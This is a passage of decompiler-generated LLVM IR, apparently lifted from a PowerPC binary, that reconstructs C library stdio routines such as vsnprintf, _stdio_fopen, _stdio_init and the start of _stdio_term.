  store i32 %v2_100080fc, i32* @r6, align 4
  store i32 2, i32* %stack_var_-104, align 4
  %v2_1000814c = ptrtoint i32* %stack_var_-96 to i32
  store i32 %v2_1000814c, i32* %stack_var_-96, align 4
  store i32 268468568, i32* @lr, align 4
  %v0_10008154 = call i32 @__GI_vsnprintf()
  ret i32 %v0_10008154
}

define i32 @__GI_vsnprintf() local_unnamed_addr {
entry:
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %v0_10008174 = load i32, i32* @r4, align 4
  store i32 %v0_10008174, i32* @r27, align 4
  store i32 208, i32* %stack_var_-104, align 4
  %v0_10008190 = load i32, i32* @r3, align 4
  %v1_10008190 = sub i32 -1, %v0_10008190
  store i32 %v1_10008190, i32* %r30.global-to-local, align 4
  store i32 0, i32* @r26, align 4
  store i32 %v0_10008190, i32* %r31.global-to-local, align 4
  %v2_100081a4 = ptrtoint i32* %stack_var_-48 to i32
  store i32 %v2_100081a4, i32* @r3, align 4
  %v0_100081a8 = load i32, i32* @r5, align 4
  store i32 %v0_100081a8, i32* %r29.global-to-local, align 4
  %v0_100081ac = load i32, i32* @r6, align 4
  store i32 %v0_100081ac, i32* @r28, align 4
  store i32 268468668, i32* @lr, align 4
  %v0_100081b8 = call i32 @__stdio_init_mutex()
  %v0_100081bc = load i32, i32* %r30.global-to-local, align 4
  %v1_100081bc = load i32, i32* @r27, align 4
  %v3_100081bc = icmp ugt i32 %v0_100081bc, %v1_100081bc
  %v0_100081c0 = load i32, i32* %r29.global-to-local, align 4
  store i32 %v0_100081c0, i32* @r4, align 4
  %v0_100081c4 = load i32, i32* @r28, align 4
  store i32 %v0_100081c4, i32* @r5, align 4
  %v2_100081c8 = ptrtoint i32* %stack_var_-104 to i32
  store i32 %v2_100081c8, i32* @r3, align 4
  br i1 %v3_100081bc, label %dec_label_pc_100081d4, label %dec_label_pc_100081d8

dec_label_pc_100081d4:                            ; preds = %entry
  store i32 %v1_100081bc, i32* %r30.global-to-local, align 4
  br label %dec_label_pc_100081d8

dec_label_pc_100081d8:                            ; preds = %entry, %dec_label_pc_100081d4
  %v1_100081d8 = phi i32 [ %v0_100081bc, %entry ], [ %v1_100081bc, %dec_label_pc_100081d4 ]
  %v0_100081d8 = load i32, i32* %r31.global-to-local, align 4
  store i32 268468728, i32* @lr, align 4
  %v0_100081f4 = call i32 @_vfprintf_internal()
  %v0_100081f8 = load i32, i32* @r30, align 4
  %v3_100081f8 = icmp eq i32 %v0_100081f8, 0
  br i1 %v3_100081f8, label %dec_label_pc_10008220, label %dec_label_pc_10008200

dec_label_pc_10008200:                            ; preds = %dec_label_pc_100081d8
  %v4_1000820c = icmp eq i32 %v1_100081d8, 0
  %v1_10008208 = sext i1 %v4_1000820c to i32
  %v0_10008214.v0_100081d8 = add i32 %v0_100081d8, %v1_10008208
  %stack_var_-88.0 = inttoptr i32 %v0_10008214.v0_100081d8 to i8*
  %v0_1000821c = load i32, i32* @r26, align 4
  %v1_1000821c = trunc i32 %v0_1000821c to i8
  store i8 %v1_1000821c, i8* %stack_var_-88.0, align 1
  br label %dec_label_pc_10008220

dec_label_pc_10008220:                            ; preds = %dec_label_pc_100081d8, %dec_label_pc_10008200
  ret i32 %v0_100081f4

; uselistorder directives
  uselistorder i32 %v0_10008190, { 1, 0 }
  uselistorder i32* %stack_var_-104, { 1, 0 }
  uselistorder label %dec_label_pc_10008220, { 1, 0 }
  uselistorder label %dec_label_pc_100081d8, { 1, 0 }
}

define i32 @_stdio_fopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %cr0_eq.global-to-local = alloca i1, align 1
  %r0.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg2 to i32
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %v0_10008234 = load i32, i32* @lr, align 4
  store i32 %v0_10008234, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* @r27, align 4
  %v0_10008248 = load i32, i32* @r5, align 4
  store i32 %v0_10008248, i32* @r31, align 4
  %v0_1000824c = load i32, i32* @r6, align 4
  store i32 %v0_1000824c, i32* @r29, align 4
  %v3_10008250 = load i8, i8* %arg2, align 1
  %v4_10008250 = zext i8 %v3_10008250 to i32
  store i32 %v4_10008250, i32* %r0.global-to-local, align 4
  %v3_10008254 = icmp eq i8 %v3_10008250, 114
  br i1 %v3_10008254, label %dec_label_pc_100082a0, label %dec_label_pc_1000825c

dec_label_pc_1000825c:                            ; preds = %entry
  %v3_1000825c = icmp eq i8 %v3_10008250, 119
  store i32 577, i32* @r28, align 4
  br i1 %v3_1000825c, label %dec_label_pc_100082a4, label %dec_label_pc_10008268

dec_label_pc_10008268:                            ; preds = %dec_label_pc_1000825c
  %v3_10008268 = icmp eq i8 %v3_10008250, 97
  store i32 1089, i32* @r28, align 4
  br i1 %v3_10008268, label %dec_label_pc_100082a4, label %dec_label_pc_10008274

dec_label_pc_10008274:                            ; preds = %dec_label_pc_10008334, %dec_label_pc_10008304, %dec_label_pc_10008268
  %v0_10008274 = call i32 @__errno_location()
  %v0_10008278 = load i32, i32* @r31, align 4
  %v3_10008278 = icmp eq i32 %v0_10008278, 0
  store i32 22, i32* %r0.global-to-local, align 4
  %v2_10008280 = inttoptr i32 %v0_10008274 to i32*
  store i32 22, i32* %v2_10008280, align 4
  br i1 %v3_10008278, label %dec_label_pc_100084d4, label %dec_label_pc_10008288

dec_label_pc_10008288:                            ; preds = %dec_label_pc_10008368, %dec_label_pc_10008274
  %v0_10008288 = load i32, i32* @r31, align 4
  %v1_10008288 = inttoptr i32 %v0_10008288 to i16*
  %v2_10008288 = load i16, i16* %v1_10008288, align 2
  %v3_10008288 = zext i16 %v2_10008288 to i32
  store i32 %v3_10008288, i32* %r0.global-to-local, align 4
  %v1_1000828c = and i32 %v3_10008288, 8192
  store i32 %v1_1000828c, i32* %r9.global-to-local, align 4
  %v3_1000828c = icmp eq i32 %v1_1000828c, 0
  store i1 %v3_1000828c, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000828c, label %dec_label_pc_100084d4, label %dec_label_pc_10008294

dec_label_pc_10008294:                            ; preds = %dec_label_pc_10008288
  store i32 %v0_10008288, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_1000829c.566 to i32), i32* @lr, align 4
  %v0_10008298 = call i32 @free()
  br label %dec_label_pc_100084d4

dec_label_pc_100082a0:                            ; preds = %entry
  store i32 0, i32* @r28, align 4
  br label %dec_label_pc_100082a4

dec_label_pc_100082a4:                            ; preds = %dec_label_pc_10008268, %dec_label_pc_1000825c, %dec_label_pc_100082a0
  %v0_100082c4 = phi i32 [ 1089, %dec_label_pc_10008268 ], [ 577, %dec_label_pc_1000825c ], [ 1, %dec_label_pc_100082a0 ]
  %v2_100082a4 = add i32 %tmp, 1
  %v3_100082a4 = inttoptr i32 %v2_100082a4 to i8*
  %v4_100082a4 = load i8, i8* %v3_100082a4, align 1
  %v5_100082a4 = zext i8 %v4_100082a4 to i32
  store i32 %v5_100082a4, i32* %r0.global-to-local, align 4
  %v3_100082ac = icmp eq i8 %v4_100082a4, 98
  br i1 %v3_100082ac, label %dec_label_pc_100082b8, label %dec_label_pc_100082b4

dec_label_pc_100082b4:                            ; preds = %dec_label_pc_100082a4
  br label %dec_label_pc_100082b8

dec_label_pc_100082b8:                            ; preds = %dec_label_pc_100082a4, %dec_label_pc_100082b4
  %storemerge = phi i32 [ %tmp, %dec_label_pc_100082b4 ], [ %v2_100082a4, %dec_label_pc_100082a4 ]
  %v0_100082b8 = phi i32 [ %tmp, %dec_label_pc_100082b4 ], [ %v2_100082a4, %dec_label_pc_100082a4 ]
  store i32 %storemerge, i32* %r9.global-to-local, align 4
  %v1_100082b8 = add i32 %v0_100082b8, 1
  %v2_100082b8 = inttoptr i32 %v1_100082b8 to i8*
  %v3_100082b8 = load i8, i8* %v2_100082b8, align 1
  %v4_100082b8 = zext i8 %v3_100082b8 to i32
  store i32 %v4_100082b8, i32* %r0.global-to-local, align 4
  %v3_100082bc = icmp eq i8 %v3_100082b8, 43
  br i1 %v3_100082bc, label %dec_label_pc_100082c4, label %dec_label_pc_100082cc

dec_label_pc_100082c4:                            ; preds = %dec_label_pc_100082b8
  store i32 %v0_100082c4, i32* %r9.global-to-local, align 4
  %v1_100082c8 = add nuw nsw i32 %v0_100082c4, 1
  store i32 %v1_100082c8, i32* @r28, align 4
  br label %dec_label_pc_100082cc

dec_label_pc_100082cc:                            ; preds = %dec_label_pc_100082b8, %dec_label_pc_100082c4
  %v3_100082cc = icmp eq i32 %v0_10008248, 0
  br i1 %v3_100082cc, label %dec_label_pc_100082d4, label %dec_label_pc_100082fc

dec_label_pc_100082d4:                            ; preds = %dec_label_pc_100082cc
  store i32 80, i32* @r3, align 4
  store i32 268468956, i32* @lr, align 4
  %v0_100082d8 = call i32 @malloc()
  store i32 %v0_100082d8, i32* @r31, align 4
  %v4_100082dc = icmp eq i32 %v0_100082d8, 0
  store i1 %v4_100082dc, i1* %cr0_eq.global-to-local, align 1
  br i1 %v4_100082dc, label %dec_label_pc_100084d8, label %dec_label_pc_100082e4

dec_label_pc_100082e4:                            ; preds = %dec_label_pc_100082d4
  %v1_100082e8 = add i32 %v0_100082d8, 56
  store i32 %v1_100082e8, i32* @r3, align 4
  %v3_100082ec = inttoptr i32 %v0_100082d8 to i16*
  store i16 8192, i16* %v3_100082ec, align 2
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_100082f4 = load i32, i32* @r31, align 4
  %v2_100082f4 = add i32 %v1_100082f4, 8
  %v3_100082f4 = inttoptr i32 %v2_100082f4 to i32*
  store i32 0, i32* %v3_100082f4, align 4
  store i32 268468988, i32* @lr, align 4
  %v0_100082f8 = call i32 @__stdio_init_mutex()
  %v0_100082fc.pre = load i32, i32* @r29, align 4
  br label %dec_label_pc_100082fc

dec_label_pc_100082fc:                            ; preds = %dec_label_pc_100082cc, %dec_label_pc_100082e4
  %v0_1000835c = phi i32 [ %v0_1000824c, %dec_label_pc_100082cc ], [ %v0_100082fc.pre, %dec_label_pc_100082e4 ]
  %v1_100082fc = icmp slt i32 %v0_1000835c, 0
  br i1 %v1_100082fc, label %dec_label_pc_1000835c, label %dec_label_pc_10008304

dec_label_pc_10008304:                            ; preds = %dec_label_pc_100082fc
  %v1_10008308 = add i32 %arg1, 1
  store i32 %v1_10008308, i32* %r0.global-to-local, align 4
  store i32 65539, i32* %r9.global-to-local, align 4
  %v1_10008310 = load i32, i32* @r31, align 4
  %v2_10008310 = add i32 %v1_10008310, 4
  %v3_10008310 = inttoptr i32 %v2_10008310 to i32*
  store i32 %v0_1000835c, i32* %v3_10008310, align 4
  %v0_10008314 = load i32, i32* @r28, align 4
  %v1_10008314 = load i32, i32* %r9.global-to-local, align 4
  %v2_10008314 = and i32 %v1_10008314, %v0_10008314
  %v1_10008318 = add i32 %v2_10008314, 1
  store i32 %v1_10008318, i32* %r9.global-to-local, align 4
  %v1_1000831c = load i32, i32* %r0.global-to-local, align 4
  %v2_1000831c = and i32 %v1_1000831c, %v1_10008318
  store i32 %v2_1000831c, i32* %r0.global-to-local, align 4
  %v4_10008320 = icmp eq i32 %v2_1000831c, %v1_10008318
  br i1 %v4_10008320, label %dec_label_pc_10008328, label %dec_label_pc_10008274

dec_label_pc_10008328:                            ; preds = %dec_label_pc_10008304
  %v2_10008328 = sub i32 -1, %arg1
  %v3_10008328 = and i32 %v0_10008314, %v2_10008328
  store i32 %v3_10008328, i32* %r0.global-to-local, align 4
  %v1_1000832c = and i32 %v3_10008328, 1024
  store i32 %v1_1000832c, i32* %r9.global-to-local, align 4
  %v3_1000832c = icmp eq i32 %v1_1000832c, 0
  store i1 %v3_1000832c, i1* %cr0_eq.global-to-local, align 1
  br i1 %v3_1000832c, label %dec_label_pc_10008350, label %dec_label_pc_10008334

dec_label_pc_10008334:                            ; preds = %dec_label_pc_10008328
  %v0_10008334 = load i32, i32* @r29, align 4
  store i32 268469064, i32* @lr, align 4
  %v2_10008344 = call i32 @__libc_fcntl(i32 %v0_10008334, i32 4)
  %v3_10008348 = icmp eq i32 %v2_10008344, 0
  br i1 %v3_10008348, label %dec_label_pc_10008350, label %dec_label_pc_10008274

dec_label_pc_10008350:                            ; preds = %dec_label_pc_10008334, %dec_label_pc_10008328
  %v1_10008350 = call i32 @__asm_rlwinm(i32 %arg1, i32 0, i32 15, i32 15)
  store i32 %v1_10008350, i32* %r0.global-to-local, align 4
  %v0_10008354 = load i32, i32* @r28, align 4
  %v2_10008354 = or i32 %v0_10008354, %v1_10008350
  store i32 %v2_10008354, i32* @r28, align 4
  br label %dec_label_pc_10008388

dec_label_pc_1000835c:                            ; preds = %dec_label_pc_100082fc
  %v3_1000835c = icmp eq i32 %v0_1000835c, -1
  %v0_1000836c.pre = load i32, i32* @r28, align 4
  br i1 %v3_1000835c, label %dec_label_pc_10008368, label %dec_label_pc_10008364

dec_label_pc_10008364:                            ; preds = %dec_label_pc_1000835c
  %v1_10008364 = or i32 %v0_1000836c.pre, 65536
  store i32 %v1_10008364, i32* @r28, align 4
  br label %dec_label_pc_10008368

dec_label_pc_10008368:                            ; preds = %dec_label_pc_1000835c, %dec_label_pc_10008364
  %v0_1000836c = phi i32 [ %v1_10008364, %dec_label_pc_10008364 ], [ %v0_1000836c.pre, %dec_label_pc_1000835c ]
  store i32 438, i32* @r5, align 4
  store i32 268469116, i32* @lr, align 4
  %v2_10008378 = call i32 @__libc_open(i32 %arg1, i32 %v0_1000836c)
  %v1_1000837c = icmp slt i32 %v2_10008378, 0
  %v1_10008380 = load i32, i32* @r31, align 4
  %v2_10008380 = add i32 %v1_10008380, 4
  %v3_10008380 = inttoptr i32 %v2_10008380 to i32*
  store i32 %v2_10008378, i32* %v3_10008380, align 4
  br i1 %v1_1000837c, label %dec_label_pc_10008288, label %dec_label_pc_10008368.dec_label_pc_10008388_crit_edge

dec_label_pc_10008368.dec_label_pc_10008388_crit_edge: ; preds = %dec_label_pc_10008368
  %v0_1000838c.pre = load i32, i32* @r28, align 4
  br label %dec_label_pc_10008388

dec_label_pc_10008388:                            ; preds = %dec_label_pc_10008368.dec_label_pc_10008388_crit_edge, %dec_label_pc_10008350
  %v0_1000838c = phi i32 [ %v0_1000838c.pre, %dec_label_pc_10008368.dec_label_pc_10008388_crit_edge ], [ %v2_10008354, %dec_label_pc_10008350 ]
  %v0_10008388 = load i32, i32* @r31, align 4
  %v1_10008388 = inttoptr i32 %v0_10008388 to i16*
  %v2_10008388 = load i16, i16* %v1_10008388, align 2
  %v3_10008388 = zext i16 %v2_10008388 to i32
  store i32 %v3_10008388, i32* %r0.global-to-local, align 4
  %v1_1000838c = urem i32 %v0_1000838c, 4
  store i32 %v1_1000838c, i32* %r29.global-to-local, align 4
  %v1_10008390 = call i32 @__asm_rlwinm(i32 %v0_1000838c, i32 0, i32 21, i32 21)
  %v1_10008394 = add nuw nsw i32 %v1_1000838c, 1
  store i32 %v1_10008394, i32* %r29.global-to-local, align 4
  %v1_10008398 = call i32 @__asm_rlwinm(i32 %v3_10008388, i32 0, i32 18, i32 18)
  store i32 %v1_10008398, i32* %r0.global-to-local, align 4
  %v1_1000839c = xor i32 %v1_10008394, 3
  store i32 %v1_1000839c, i32* %r29.global-to-local, align 4
  %v1_100083a0 = urem i32 %v1_10008398, 65536
  store i32 %v1_100083a0, i32* %r9.global-to-local, align 4
  %v0_100083a4 = load i32, i32* @r28, align 4
  %v1_100083a4 = call i32 @__asm_rlwinm(i32 %v0_100083a4, i32 31, i32 16, i32 16)
  %v2_100083a8 = or i32 %v1_100083a4, %v1_10008390
  store i32 %v2_100083a8, i32* %r0.global-to-local, align 4
  %v0_100083ac = load i32, i32* %r29.global-to-local, align 4
  %v1_100083ac = mul i32 %v0_100083ac, 16
  %v0_100083b0 = load i32, i32* %r9.global-to-local, align 4
  %v2_100083b0 = or i32 %v0_100083b0, %v2_100083a8
  store i32 %v2_100083b0, i32* %r9.global-to-local, align 4
  %v2_100083b4 = or i32 %v2_100083b0, %v1_100083ac
  store i32 %v2_100083b4, i32* @r29, align 4
  %v1_100083b8 = trunc i32 %v2_100083b4 to i16
  %v2_100083b8 = load i32, i32* @r31, align 4
  %v3_100083b8 = inttoptr i32 %v2_100083b8 to i16*
  store i16 %v1_100083b8, i16* %v3_100083b8, align 2
  %v0_100083bc = call i32 @__errno_location()
  store i32 %v0_100083bc, i32* @r28, align 4
  %v0_100083c4 = load i32, i32* @r31, align 4
  %v1_100083c4 = add i32 %v0_100083c4, 4
  %v2_100083c4 = inttoptr i32 %v1_100083c4 to i32*
  %v3_100083c4 = load i32, i32* %v2_100083c4, align 4
  %v1_100083c8 = inttoptr i32 %v0_100083bc to i32*
  %v2_100083c8 = load i32, i32* %v1_100083c8, align 4
  store i32 %v2_100083c8, i32* @r27, align 4
  store i32 268469200, i32* @lr, align 4
  %v1_100083cc = call i32 @isatty(i32 %v3_100083c4)
  %v1_100083d0 = mul i32 %v1_100083cc, 256
  %v0_100083d4 = load i32, i32* @r29, align 4
  %v2_100083d4 = or i32 %v0_100083d4, %v1_100083d0
  store i32 %v2_100083d4, i32* @r29, align 4
  %v1_100083d8 = trunc i32 %v2_100083d4 to i16
  %v2_100083d8 = load i32, i32* @r31, align 4
  %v3_100083d8 = inttoptr i32 %v2_100083d8 to i16*
  store i16 %v1_100083d8, i16* %v3_100083d8, align 2
  %v0_100083dc = load i32, i32* @r27, align 4
  %v1_100083dc = load i32, i32* @r28, align 4
  %v2_100083dc = inttoptr i32 %v1_100083dc to i32*
  store i32 %v0_100083dc, i32* %v2_100083dc, align 4
  %v0_100083e0 = load i32, i32* @r31, align 4
  %v1_100083e0 = add i32 %v0_100083e0, 8
  %v2_100083e0 = inttoptr i32 %v1_100083e0 to i32*
  %v3_100083e0 = load i32, i32* %v2_100083e0, align 4
  store i32 %v3_100083e0, i32* %r0.global-to-local, align 4
  %v3_100083e4 = icmp eq i32 %v3_100083e0, 0
  br i1 %v3_100083e4, label %dec_label_pc_100083ec, label %dec_label_pc_1000841c

dec_label_pc_100083ec:                            ; preds = %dec_label_pc_10008388
  store i32 4096, i32* @r3, align 4
  store i32 268469236, i32* @lr, align 4
  %v0_100083f0 = call i32 @malloc()
  %v3_100083f4 = icmp eq i32 %v0_100083f0, 0
  %v1_100083f8 = load i32, i32* @r31, align 4
  %v2_100083f8 = add i32 %v1_100083f8, 8
  %v3_100083f8 = inttoptr i32 %v2_100083f8 to i32*
  store i32 %v0_100083f0, i32* %v3_100083f8, align 4
  %v1_10008418 = load i32, i32* @r31, align 4
  br i1 %v3_100083f4, label %dec_label_pc_10008418, label %dec_label_pc_10008400

dec_label_pc_10008400:                            ; preds = %dec_label_pc_100083ec
  %v1_10008400 = inttoptr i32 %v1_10008418 to i16*
  %v2_10008400 = load i16, i16* %v1_10008400, align 2
  %v3_10008400 = zext i16 %v2_10008400 to i32
  store i32 %v3_10008400, i32* %r0.global-to-local, align 4
  %v1_10008404 = add i32 %v0_100083f0, 4096
  store i32 %v1_10008404, i32* %r9.global-to-local, align 4
  %v2_10008408 = add i32 %v1_10008418, 12
  %v3_10008408 = inttoptr i32 %v2_10008408 to i32*
  store i32 %v1_10008404, i32* %v3_10008408, align 4
  %v0_1000840c = load i32, i32* %r0.global-to-local, align 4
  %v1_1000840c = or i32 %v0_1000840c, 16384
  store i32 %v1_1000840c, i32* %r0.global-to-local, align 4
  %v1_10008410 = trunc i32 %v1_1000840c to i16
  %v2_10008410 = load i32, i32* @r31, align 4
  %v3_10008410 = inttoptr i32 %v2_10008410 to i16*
  store i16 %v1_10008410, i16* %v3_10008410, align 2
  br label %dec_label_pc_1000841c

dec_label_pc_10008418:                            ; preds = %dec_label_pc_100083ec
  %v2_10008418 = add i32 %v1_10008418, 12
  %v3_10008418 = inttoptr i32 %v2_10008418 to i32*
  store i32 0, i32* %v3_10008418, align 4
  br label %dec_label_pc_1000841c

dec_label_pc_1000841c:                            ; preds = %dec_label_pc_10008388, %dec_label_pc_10008400, %dec_label_pc_10008418
  %v0_1000841c = load i32, i32* @r31, align 4
  %v1_1000841c = inttoptr i32 %v0_1000841c to i16*
  %v2_1000841c = load i16, i16* %v1_1000841c, align 2
  %v3_1000841c = zext i16 %v2_1000841c to i32
  store i32 %v3_1000841c, i32* %r0.global-to-local, align 4
  %v1_10008420 = add i32 %v0_1000841c, 8
  %v2_10008420 = inttoptr i32 %v1_10008420 to i32*
  %v3_10008420 = load i32, i32* %v2_10008420, align 4
  store i32 %v3_10008420, i32* %r9.global-to-local, align 4
  %v1_10008424 = and i32 %v3_1000841c, 8192
  %v3_10008424 = icmp eq i32 %v1_10008424, 0
  store i1 %v3_10008424, i1* %cr0_eq.global-to-local, align 1
  %v3_1000842c = add i32 %v0_1000841c, 2
  %v4_1000842c = inttoptr i32 %v3_1000842c to i8*
  store i8 0, i8* %v4_1000842c, align 1
  store i32 0, i32* %r0.global-to-local, align 4
  %v0_10008434 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008434 = load i32, i32* @r31, align 4
  %v2_10008434 = add i32 %v1_10008434, 20
  %v3_10008434 = inttoptr i32 %v2_10008434 to i32*
  store i32 %v0_10008434, i32* %v3_10008434, align 4
  %v0_10008438 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008438 = load i32, i32* @r31, align 4
  %v2_10008438 = add i32 %v1_10008438, 24
  %v3_10008438 = inttoptr i32 %v2_10008438 to i32*
  store i32 %v0_10008438, i32* %v3_10008438, align 4
  %v0_1000843c = load i32, i32* %r9.global-to-local, align 4
  %v1_1000843c = load i32, i32* @r31, align 4
  %v2_1000843c = add i32 %v1_1000843c, 28
  %v3_1000843c = inttoptr i32 %v2_1000843c to i32*
  store i32 %v0_1000843c, i32* %v3_1000843c, align 4
  %v0_10008440 = load i32, i32* %r9.global-to-local, align 4
  %v1_10008440 = load i32, i32* @r31, align 4
  %v2_10008440 = add i32 %v1_10008440, 16
  %v3_10008440 = inttoptr i32 %v2_10008440 to i32*
  store i32 %v0_10008440, i32* %v3_10008440, align 4
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v0_10008448 = load i32, i32* %r0.global-to-local, align 4
  %v1_10008448 = load i32, i32* @r31, align 4
  %v2_10008448 = add i32 %v1_10008448, 44
  %v3_10008448 = inttoptr i32 %v2_10008448 to i32*
  store i32 %v0_10008448, i32* %v3_10008448, align 4
  %v3_1000844c = load i32, i32* @global_var_10024a0c.567, align 4
  store i32 %v3_1000844c, i32* %r0.global-to-local, align 4
  %v1_10008450 = load i32, i32* @r31, align 4
  %v2_10008450 = add i32 %v1_10008450, 52
  %v3_10008450 = inttoptr i32 %v2_10008450 to i32*
  store i32 %v3_1000844c, i32* %v3_10008450, align 4
  %v0_10008454 = load i1, i1* %cr0_eq.global-to-local, align 1
  br i1 %v0_10008454, label %dec_label_pc_100084d8, label %dec_label_pc_10008458

dec_label_pc_10008458:                            ; preds = %dec_label_pc_1000841c
  store i32 ptrtoint ([3 x i8]* @global_var_1000c0d8.561 to i32), i32* @r28, align 4
  store i32 ptrtoint (i32* @global_var_100246c4.562 to i32), i32* %r29.global-to-local, align 4
  %v2_10008468 = ptrtoint i32* %stack_var_-56 to i32
  store i32 %v2_10008468, i32* @r26, align 4
  store i32 %v2_10008468, i32* @r3, align 4
  %v0_10008478 = call i32 @__pthread_return_void()
  %v2_10008484 = ptrtoint i32* %stack_var_-40 to i32
  store i32 %v2_10008484, i32* @r27, align 4
  store i32 ptrtoint (i32* @global_var_100246ac.568 to i32), i32* @r29, align 4
  %v0_1000848c = call i32 @__pthread_return_0()
  store i32 %v2_10008484, i32* @r3, align 4
  %v0_1000849c = call i32 @__pthread_return_void()
  %v0_100084a4 = call i32 @__pthread_return_0()
  store i32 268566528, i32* %r9.global-to-local, align 4
  %v3_100084ac = load i32, i32* bitcast (i32** @global_var_10024a08.569 to i32*), align 4
  store i32 %v3_100084ac, i32* %r0.global-to-local, align 4
  store i32 %v2_10008484, i32* @r3, align 4
  %v1_100084b8 = load i32, i32* @r31, align 4
  %v2_100084b8 = add i32 %v1_100084b8, 32
  %v3_100084b8 = inttoptr i32 %v2_100084b8 to i32*
  store i32 %v3_100084ac, i32* %v3_100084b8, align 4
  %v0_100084bc = load i32, i32* @r31, align 4
  store i32 %v0_100084bc, i32* bitcast (i32** @global_var_10024a08.569 to i32*), align 4
  %v0_100084c0 = call i32 @__pthread_return_void()
  store i32 %v2_10008468, i32* @r3, align 4
  %v0_100084cc = call i32 @__pthread_return_void()
  br label %dec_label_pc_100084d8

dec_label_pc_100084d4:                            ; preds = %dec_label_pc_10008288, %dec_label_pc_10008274, %dec_label_pc_10008294
  store i32 0, i32* @r31, align 4
  br label %dec_label_pc_100084d8

dec_label_pc_100084d8:                            ; preds = %dec_label_pc_1000841c, %dec_label_pc_100082d4, %dec_label_pc_10008458, %dec_label_pc_100084d4
  store i32 %v0_10008234, i32* %r0.global-to-local, align 4
  %v0_100084dc = load i32, i32* @r31, align 4
  ret i32 %v0_100084dc

; uselistorder directives
  uselistorder i32 %v1_10008418, { 2, 0, 1 }
  uselistorder i32 %v0_1000838c, { 1, 0 }
  uselistorder i32 %v0_100082d8, { 1, 0, 2, 3 }
  uselistorder i32 %v0_100082c4, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 0, 17 }
  uselistorder i32 16384, { 4, 0, 1, 2, 3 }
  uselistorder i32 21, { 1, 2, 0, 3 }
  uselistorder i32 577, { 0, 3, 1, 2 }
  uselistorder i8 114, { 0, 2, 1, 3 }
  uselistorder i32 %arg1, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_100084d8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_100084d4, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000841c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10008368, { 1, 0 }
  uselistorder label %dec_label_pc_100082fc, { 1, 0 }
  uselistorder label %dec_label_pc_100082cc, { 1, 0 }
  uselistorder label %dec_label_pc_100082b8, { 1, 0 }
  uselistorder label %dec_label_pc_100082a4, { 2, 0, 1 }
}

define i32 @_stdio_init(i32 %arg1) local_unnamed_addr {
entry:
  store i32 268566528, i32* @r28, align 4
  %v0_10008504 = call i32 @__errno_location()
  store i32 %v0_10008504, i32* @r26, align 4
  %v1_10008510 = inttoptr i32 %v0_10008504 to i32*
  %v2_10008510 = load i32, i32* %v1_10008510, align 4
  store i32 %v2_10008510, i32* @r25, align 4
  store i32 ptrtoint (i16* @global_var_100246dc.557 to i32), i32* @r27, align 4
  %v3_10008518 = load i16, i16* @global_var_100246dc.557, align 2
  %v4_10008518 = zext i16 %v3_10008518 to i32
  store i32 %v4_10008518, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_10008520.571 to i32), i32* @lr, align 4
  %v1_1000851c = call i32 @isatty(i32 0)
  %v1_10008520 = sub i32 1, %v1_1000851c
  %v1_10008524 = mul i32 %v1_10008520, 256
  %v0_10008528 = load i32, i32* @r29, align 4
  %v2_10008528 = xor i32 %v1_10008524, %v0_10008528
  %v1_10008530 = trunc i32 %v2_10008528 to i16
  store i16 %v1_10008530, i16* @global_var_100246dc.557, align 2
  %v3_10008534 = load i16, i16* @global_var_1002472c.558, align 2
  %v4_10008534 = zext i16 %v3_10008534 to i32
  store i32 %v4_10008534, i32* @r29, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_1000853c.572 to i32), i32* @lr, align 4
  %v1_10008538 = call i32 @isatty(i32 1)
  %v1_1000853c = sub i32 1, %v1_10008538
  %v1_10008540 = mul i32 %v1_1000853c, 256
  %v0_10008544 = load i32, i32* @r29, align 4
  %v2_10008544 = xor i32 %v1_10008540, %v0_10008544
  %v1_10008548 = trunc i32 %v2_10008544 to i16
  store i16 %v1_10008548, i16* @global_var_1002472c.558, align 2
  %v0_1000854c = load i32, i32* @r25, align 4
  %v1_1000854c = load i32, i32* @r26, align 4
  %v2_1000854c = inttoptr i32 %v1_1000854c to i32*
  store i32 %v0_1000854c, i32* %v2_1000854c, align 4
  ret i32 %v1_10008540

; uselistorder directives
  uselistorder i32 %v1_10008540, { 1, 0 }
  uselistorder i16* @global_var_1002472c.558, { 1, 0 }
}

define i32 @__stdio_init_mutex() local_unnamed_addr {
entry:
  store i32 24, i32* @r5, align 4
  store i32 ptrtoint (i32* @global_var_100128c8.573 to i32), i32* @r4, align 4
  %v0_10008570 = call i32 @memcpy()
  ret i32 %v0_10008570
}

define i32 @_stdio_term(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_100246ac.568 to i32), i32* @r3, align 4
  store i32 268469648, i32* @lr, align 4
  %v0_1000858c = call i32 @__stdio_init_mutex()
  store i32 ptrtoint (i32* @global_var_100246c4.562 to i32), i32* @r3, align 4
  store i32 268469660, i32* @lr, align 4
  %v0_10008598 = call i32 @__stdio_init_mutex()
  store i32 268566528, i32* %r9.global-to-local, align 4
  %storemerge6 = load i32, i32* bitcast (i32** @global_var_10024a08.569 to i32*), align 4
  store i32 %storemerge6, i32* %r31.global-to-local, align 4
  %v3_100085e49 = icmp eq i32 %storemerge6, 0
  %v1_100085e811 = add i32 %storemerge6, 56
